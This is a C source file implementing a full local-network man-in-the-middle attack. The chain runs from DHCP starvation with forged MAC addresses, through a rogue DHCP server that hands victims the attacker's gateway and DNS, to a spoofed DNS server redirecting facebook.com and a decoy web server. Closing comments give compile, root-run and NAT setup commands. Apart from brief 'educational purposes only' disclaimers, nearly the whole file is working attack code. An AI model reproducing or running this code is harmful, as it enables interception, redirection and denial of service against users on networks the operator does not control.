// DHCP Spoofing and Man-in-the-Middle Attack Implementation
// Educational purposes only - for understanding network security vulnerabilities

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include <sys/ioctl.h>
#include <time.h>
#include <pthread.h>

// DHCP Message Types
#define DHCP_DISCOVER 1
#define DHCP_OFFER    2
#define DHCP_REQUEST  3
#define DHCP_ACK      5

// DHCP Options
#define DHCP_OPTION_MESSAGE_TYPE  53
#define DHCP_OPTION_SERVER_ID     54
#define DHCP_OPTION_SUBNET_MASK   1
#define DHCP_OPTION_ROUTER        3
#define DHCP_OPTION_DNS           6
#define DHCP_OPTION_END           255

// Ports
#define DHCP_SERVER_PORT 67
#define DHCP_CLIENT_PORT 68
#define DNS_PORT 53
#define HTTP_PORT 80

// DHCP Packet Structure
typedef struct {
    uint8_t op;
    uint8_t htype;
    uint8_t hlen;
    uint8_t hops;
    uint32_t xid;
    uint16_t secs;
    uint16_t flags;
    uint32_t ciaddr;
    uint32_t yiaddr;
    uint32_t siaddr;
    uint32_t giaddr;
    uint8_t chaddr[16];
    uint8_t sname[64];
    uint8_t file[128];
    uint32_t magic_cookie;
    uint8_t options[312];
} dhcp_packet;

// DNS Header Structure
typedef struct {
    uint16_t id;
    uint16_t flags;
    uint16_t qdcount;
    uint16_t ancount;
    uint16_t nscount;
    uint16_t arcount;
} dns_header;

// Global variables for our malicious server
char *malicious_gateway = "192.168.1.100";  // Our IP
char *malicious_dns = "192.168.1.100";      // Our IP
char *target_network = "192.168.1.0";
char *subnet_mask = "255.255.255.0";

// ===========================================
// PART 1: DHCP STARVATION ATTACK
// ===========================================
void dhcp_starvation_attack(char *interface) {
    int sock;
    struct sockaddr_ll sll;
    dhcp_packet packet;
    uint8_t fake_mac[6];
    int i;
    
    // Create raw socket
    sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sock < 0) {
        perror("Socket creation failed");
        return;
    }
    
    // Get interface index
    struct ifreq ifr;
    strncpy(ifr.ifr_name, interface, IFNAMSIZ);
    if (ioctl(sock, SIOCGIFINDEX, &ifr) < 0) {
        perror("Interface not found");
        close(sock);
        return;
    }
    
    // Setup socket address
    memset(&sll, 0, sizeof(sll));
    sll.sll_family = AF_PACKET;
    sll.sll_ifindex = ifr.ifr_ifindex;
    sll.sll_protocol = htons(ETH_P_IP);
    
    printf("Starting DHCP starvation attack...\n");
    
    // Send multiple DHCP DISCOVER messages with different MAC addresses
    for (i = 0; i < 254; i++) {
        // Generate fake MAC address
        fake_mac[0] = 0x00;
        fake_mac[1] = 0x11;
        fake_mac[2] = 0x22;
        fake_mac[3] = 0x33;
        fake_mac[4] = 0x44;
        fake_mac[5] = i;
        
        // Build DHCP DISCOVER packet
        memset(&packet, 0, sizeof(packet));
        packet.op = 1;  // BOOTREQUEST
        packet.htype = 1;  // Ethernet
        packet.hlen = 6;   // MAC address length
        packet.xid = htonl(rand());
        packet.flags = htons(0x8000);  // Broadcast flag
        memcpy(packet.chaddr, fake_mac, 6);
        packet.magic_cookie = htonl(0x63825363);
        
        // Add DHCP options
        int opt_offset = 0;
        packet.options[opt_offset++] = DHCP_OPTION_MESSAGE_TYPE;
        packet.options[opt_offset++] = 1;
        packet.options[opt_offset++] = DHCP_DISCOVER;
        packet.options[opt_offset++] = DHCP_OPTION_END;
        
        // Send packet
        if (sendto(sock, &packet, sizeof(packet), 0, 
                   (struct sockaddr *)&sll, sizeof(sll)) < 0) {
            perror("Send failed");
        } else {
            printf("Sent DHCP DISCOVER with MAC: %02x:%02x:%02x:%02x:%02x:%02x\n",
                   fake_mac[0], fake_mac[1], fake_mac[2], 
                   fake_mac[3], fake_mac[4], fake_mac[5]);
        }
        
        usleep(100000);  // Wait 100ms between requests
    }
    
    close(sock);
    printf("DHCP starvation attack completed.\n");
}

// ===========================================
// PART 2: DHCP SPOOFING SERVER
// ===========================================
void *dhcp_spoofing_server(void *arg) {
    int sock;
    struct sockaddr_in server_addr, client_addr;
    socklen_t client_len = sizeof(client_addr);
    dhcp_packet packet, response;
    
    // Create UDP socket
    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("DHCP socket creation failed");
        return NULL;
    }
    
    // Allow socket reuse
    int opt = 1;
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    setsockopt(sock, SOL_SOCKET, SO_BROADCAST, &opt, sizeof(opt));
    
    // Bind to DHCP server port
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(DHCP_SERVER_PORT);
    server_addr.sin_addr.s_addr = INADDR_ANY;
    
    if (bind(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("DHCP bind failed");
        close(sock);
        return NULL;
    }
    
    printf("Malicious DHCP server started on port %d\n", DHCP_SERVER_PORT);
    
    while (1) {
        // Receive DHCP packet
        int n = recvfrom(sock, &packet, sizeof(packet), 0,
                         (struct sockaddr *)&client_addr, &client_len);
        
        if (n < 0) continue;
        
        // Check if it's a DHCP DISCOVER or REQUEST
        uint8_t msg_type = 0;
        for (int i = 0; i < 312 && packet.options[i] != DHCP_OPTION_END; i++) {
            if (packet.options[i] == DHCP_OPTION_MESSAGE_TYPE) {
                msg_type = packet.options[i + 2];
                break;
            }
        }
        
        if (msg_type == DHCP_DISCOVER || msg_type == DHCP_REQUEST) {
            printf("Received DHCP %s from MAC: %02x:%02x:%02x:%02x:%02x:%02x\n",
                   (msg_type == DHCP_DISCOVER) ? "DISCOVER" : "REQUEST",
                   packet.chaddr[0], packet.chaddr[1], packet.chaddr[2],
                   packet.chaddr[3], packet.chaddr[4], packet.chaddr[5]);
            
            // Build response (OFFER or ACK)
            memcpy(&response, &packet, sizeof(response));
            response.op = 2;  // BOOTREPLY
            response.yiaddr = htonl(0xC0A80165);  // 192.168.1.101
            response.siaddr = inet_addr(malicious_gateway);
            
            // Add DHCP options
            int opt_offset = 0;
            
            // Message type
            response.options[opt_offset++] = DHCP_OPTION_MESSAGE_TYPE;
            response.options[opt_offset++] = 1;
            response.options[opt_offset++] = (msg_type == DHCP_DISCOVER) ? DHCP_OFFER : DHCP_ACK;
            
            // Server identifier
            response.options[opt_offset++] = DHCP_OPTION_SERVER_ID;
            response.options[opt_offset++] = 4;
            uint32_t server_ip = inet_addr(malicious_gateway);
            memcpy(&response.options[opt_offset], &server_ip, 4);
            opt_offset += 4;
            
            // Subnet mask
            response.options[opt_offset++] = DHCP_OPTION_SUBNET_MASK;
            response.options[opt_offset++] = 4;
            uint32_t mask = inet_addr(subnet_mask);
            memcpy(&response.options[opt_offset], &mask, 4);
            opt_offset += 4;
            
            // Router (gateway) - pointing to our malicious gateway
            response.options[opt_offset++] = DHCP_OPTION_ROUTER;
            response.options[opt_offset++] = 4;
            uint32_t gw = inet_addr(malicious_gateway);
            memcpy(&response.options[opt_offset], &gw, 4);
            opt_offset += 4;
            
            // DNS server - pointing to our malicious DNS
            response.options[opt_offset++] = DHCP_OPTION_DNS;
            response.options[opt_offset++] = 4;
            uint32_t dns = inet_addr(malicious_dns);
            memcpy(&response.options[opt_offset], &dns, 4);
            opt_offset += 4;
            
            // End option
            response.options[opt_offset++] = DHCP_OPTION_END;
            
            // Send response
            client_addr.sin_port = htons(DHCP_CLIENT_PORT);
            client_addr.sin_addr.s_addr = htonl(INADDR_BROADCAST);
            
            if (sendto(sock, &response, sizeof(response), 0,
                       (struct sockaddr *)&client_addr, sizeof(client_addr)) < 0) {
                perror("DHCP response send failed");
            } else {
                printf("Sent malicious DHCP %s with gateway: %s, DNS: %s\n",
                       (msg_type == DHCP_DISCOVER) ? "OFFER" : "ACK",
                       malicious_gateway, malicious_dns);
            }
        }
    }
    
    close(sock);
    return NULL;
}

// ===========================================
// PART 3: MALICIOUS DNS SERVER
// ===========================================
void *malicious_dns_server(void *arg) {
    int sock;
    struct sockaddr_in server_addr, client_addr;
    socklen_t client_len = sizeof(client_addr);
    uint8_t buffer[512];
    
    // Create UDP socket
    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("DNS socket creation failed");
        return NULL;
    }
    
    // Bind to DNS port
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(DNS_PORT);
    server_addr.sin_addr.s_addr = INADDR_ANY;
    
    if (bind(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("DNS bind failed");
        close(sock);
        return NULL;
    }
    
    printf("Malicious DNS server started on port %d\n", DNS_PORT);
    
    while (1) {
        // Receive DNS query
        int n = recvfrom(sock, buffer, sizeof(buffer), 0,
                         (struct sockaddr *)&client_addr, &client_len);
        
        if (n < 0) continue;
        
        // Parse DNS query to check if it's for facebook.com
        char queried_domain[256] = {0};
        int pos = sizeof(dns_header);
        int domain_pos = 0;
        
        while (pos < n && buffer[pos] != 0) {
            int label_len = buffer[pos];
            pos++;
            for (int i = 0; i < label_len && pos < n; i++) {
                queried_domain[domain_pos++] = buffer[pos++];
            }
            if (buffer[pos] != 0) {
                queried_domain[domain_pos++] = '.';
            }
        }
        
        printf("DNS query for: %s\n", queried_domain);
        
        // Check if it's facebook.com
        if (strstr(queried_domain, "facebook.com") != NULL) {
            printf("Intercepting facebook.com query!\n");
            
            // Build DNS response
            dns_header *header = (dns_header *)buffer;
            header->flags = htons(0x8180);  // Response, no error
            header->ancount = htons(1);     // One answer
            
            // Copy the question section
            int response_pos = n;
            
            // Add answer section
            // Name pointer to question
            buffer[response_pos++] = 0xC0;
            buffer[response_pos++] = 0x0C;
            
            // Type A (IPv4)
            buffer[response_pos++] = 0x00;
            buffer[response_pos++] = 0x01;
            
            // Class IN
            buffer[response_pos++] = 0x00;
            buffer[response_pos++] = 0x01;
            
            // TTL (300 seconds)
            buffer[response_pos++] = 0x00;
            buffer[response_pos++] = 0x00;
            buffer[response_pos++] = 0x01;
            buffer[response_pos++] = 0x2C;
            
            // Data length (4 bytes for IPv4)
            buffer[response_pos++] = 0x00;
            buffer[response_pos++] = 0x04;
            
            // IP address (our malicious web server)
            uint32_t ip = inet_addr(malicious_gateway);
            memcpy(&buffer[response_pos], &ip, 4);
            response_pos += 4;
            
            // Send response
            if (sendto(sock, buffer, response_pos, 0,
                       (struct sockaddr *)&client_addr, client_len) < 0) {
                perror("DNS response send failed");
            } else {
                printf("Sent DNS response redirecting to %s\n", malicious_gateway);
            }
        } else {
            // For other domains, you might want to forward to a real DNS server
            // For simplicity, we'll just not respond
        }
    }
    
    close(sock);
    return NULL;
}

// ===========================================
// PART 4: MALICIOUS WEB SERVER
// ===========================================
void *malicious_web_server(void *arg) {
    int server_sock, client_sock;
    struct sockaddr_in server_addr, client_addr;
    socklen_t client_len = sizeof(client_addr);
    char buffer[1024];
    
    // Create TCP socket
    server_sock = socket(AF_INET, SOCK_STREAM, 0);
    if (server_sock < 0) {
        perror("Web server socket creation failed");
        return NULL;
    }
    
    // Allow socket reuse
    int opt = 1;
    setsockopt(server_sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    
    // Bind to HTTP port
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(HTTP_PORT);
    server_addr.sin_addr.s_addr = INADDR_ANY;
    
    if (bind(server_sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("Web server bind failed");
        close(server_sock);
        return NULL;
    }
    
    // Listen for connections
    if (listen(server_sock, 5) < 0) {
        perror("Web server listen failed");
        close(server_sock);
        return NULL;
    }
    
    printf("Malicious web server started on port %d\n", HTTP_PORT);
    
    while (1) {
        // Accept client connection
        client_sock = accept(server_sock, (struct sockaddr *)&client_addr, &client_len);
        if (client_sock < 0) continue;
        
        // Read HTTP request
        int n = recv(client_sock, buffer, sizeof(buffer) - 1, 0);
        if (n > 0) {
            buffer[n] = '\0';
            printf("Received HTTP request:\n%s\n", buffer);
            
            // Send response
            char *response = "HTTP/1.1 200 OK\r\n"
                           "Content-Type: text/html\r\n"
                           "Content-Length: 89\r\n"
                           "Connection: close\r\n"
                           "\r\n"
                           "<html><head><title>Not Facebook</title></head>"
                           "<body><h1>This is not Facebook</h1></body></html>";
            
            send(client_sock, response, strlen(response), 0);
            printf("Sent 'This is not Facebook' response\n");
        }
        
        close(client_sock);
    }
    
    close(server_sock);
    return NULL;
}

// ===========================================
// MAIN FUNCTION
// ===========================================
int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("Usage: %s <interface>\n", argv[0]);
        printf("Example: %s eth0\n", argv[0]);
        return 1;
    }
    
    char *interface = argv[1];
    pthread_t dhcp_thread, dns_thread, web_thread;
    
    printf("Starting Man-in-the-Middle attack on interface %s\n", interface);
    printf("Malicious Gateway/DNS/Web server IP: %s\n", malicious_gateway);
    
    // Step 1: Perform DHCP starvation attack
    printf("\n=== Step 1: DHCP Starvation Attack ===\n");
    dhcp_starvation_attack(interface);
    
    // Step 2: Start malicious DHCP server
    printf("\n=== Step 2: Starting Malicious DHCP Server ===\n");
    if (pthread_create(&dhcp_thread, NULL, dhcp_spoofing_server, NULL) != 0) {
        perror("Failed to create DHCP thread");
        return 1;
    }
    
    // Step 3: Start malicious DNS server
    printf("\n=== Step 3: Starting Malicious DNS Server ===\n");
    if (pthread_create(&dns_thread, NULL, malicious_dns_server, NULL) != 0) {
        perror("Failed to create DNS thread");
        return 1;
    }
    
    // Step 4: Start malicious web server
    printf("\n=== Step 4: Starting Malicious Web Server ===\n");
    if (pthread_create(&web_thread, NULL, malicious_web_server, NULL) != 0) {
        perror("Failed to create web thread");
        return 1;
    }
    
    printf("\n=== All services started. Attack is active! ===\n");
    printf("When a victim connects to the network:\n");
    printf("1. They will receive our malicious DHCP configuration\n");
    printf("2. Their DNS queries will go through our DNS server\n");
    printf("3. facebook.com will be redirected to our web server\n");
    printf("4. They will see 'This is not Facebook'\n");
    
    // Wait for threads
    pthread_join(dhcp_thread, NULL);
    pthread_join(dns_thread, NULL);
    pthread_join(web_thread, NULL);
    
    return 0;
}

// ===========================================
// COMPILATION AND USAGE
// ===========================================
/*
To compile:
gcc -o dhcp_mitm dhcp_mitm.c -pthread

To run (requires root privileges):
sudo ./dhcp_mitm eth0

Additional setup required:
1. Enable IP forwarding:
   sudo sysctl -w net.ipv4.ip_forward=1

2. Configure iptables for NAT (if acting as gateway):
   sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

3. Make sure the malicious_gateway IP is configured on your interface:
   sudo ip addr add 192.168.1.100/24 dev eth0

Note: This code is for educational purposes only to understand 
network vulnerabilities. Only use in controlled lab environments
with proper authorization.
*/